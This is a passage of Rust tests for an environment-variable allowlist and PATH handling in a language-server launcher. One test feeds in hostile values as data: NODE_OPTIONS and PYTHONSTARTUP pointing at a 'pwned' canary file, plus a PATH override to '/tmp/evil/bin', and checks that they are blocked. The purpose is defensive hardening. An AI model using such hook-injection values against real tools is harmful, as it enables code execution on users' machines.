        assert!(is_safe_env_name("LANG"));
        assert!(is_safe_env_name("NO_COLOR"));
        assert!(is_safe_env_name("LOG_LEVEL"));
    }

    #[test]
    fn allowlist_matches_exactly() {
        // No prefix or substring matching: `RUST_LOG` being allowed must not
        // admit `RUST_LOG_STYLE_EVIL`, and no casing trick may get PATH in.
        assert!(!is_safe_env_name("RUST_LOG_EXTRA"));
        assert!(!is_safe_env_name("MY_RUST_LOG"));
        assert!(!is_safe_env_name("rust_log"));
        assert!(!is_safe_env_name(""));
    }

    #[test]
    fn composed_path_is_dirigents_own_with_the_server_dir_first() {
        let path =
            super::composed_path("/opt/toolchain/bin/rust-analyzer").expect("PATH should compose");
        let dirs: Vec<_> = std::env::split_paths(&path).collect();
        assert_eq!(
            dirs.first().map(|p| p.as_path()),
            Some(std::path::Path::new("/opt/toolchain/bin")),
            "the resolved server's directory must come first"
        );
        // The rest is the inherited PATH, not anything from settings.
        for inherited in std::env::split_paths(&std::env::var_os("PATH").unwrap_or_default()) {
            assert!(
                dirs.contains(&inherited),
                "inherited PATH entry {inherited:?} must be preserved"
            );
        }
        // And no duplicate entry for a directory already on PATH.
        let mut sorted = dirs.clone();
        sorted.sort();
        sorted.dedup();
        assert_eq!(sorted.len(), dirs.len(), "PATH must not contain duplicates");
    }

    #[test]
    fn spawn_ignores_interpreter_hooks_from_settings() {
        // End-to-end: a repository's settings.json cannot hand a hook variable
        // to a server. `rust-analyzer` is unlikely to exist in CI, so assert on
        // the failure mode being "binary not found" — never a spawn that
        // carried the payload.
        let dir = tempfile::tempdir().unwrap();
        let canary = dir.path().join("pwned");
        let env = vec![
            format!("NODE_OPTIONS=--require {}", canary.display()),
            format!("PYTHONSTARTUP={}", canary.display()),
            "PATH=/tmp/evil/bin".to_string(),
            "RUST_LOG=debug".to_string(),
        ];

        let result = LspClient::spawn(
            "typescript-language-server",
            "typescript-language-server",
            &["--stdio".to_string()],
            &env,
            dir.path(),
            "",
        );
        if let Err(err) = result {
            assert!(
                !err.contains("unsafe command") && !err.contains("execute an argument"),
                "unexpected rejection: {err}"
            );
        }
        assert!(!canary.exists(), "payload ran");
    }
}
